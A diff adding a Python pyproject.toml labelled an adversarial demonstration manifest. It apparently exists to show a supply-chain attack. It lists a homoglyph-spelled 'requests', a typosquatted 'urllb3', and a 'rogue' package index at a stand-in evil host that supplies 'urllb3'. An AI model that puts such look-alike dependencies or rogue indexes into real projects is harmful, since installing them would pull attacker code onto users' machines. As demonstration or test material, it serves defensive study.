@@ -1,0 +1,20 @@
+# Baysöz Labs <baysozlabs@proton.me> — adversarial demonstration manifest.
+[project]
+name = "demo-adversarial"
+version = "0.1.0"
+dependencies = [
+    "rеquests==2.31.0",
+    "fastapi==0.115.6",
+    "urllb3==2.2.3",
+]
+
+[project.optional-dependencies]
+redteam = ["semgrep==1.100.0"]
+
+[[tool.uv.index]]
+name = "rogue"
+url = "https://index.evil.invalid/simple"
+explicit = true
+
+[tool.uv.sources]
+urllb3 = { index = "rogue" }
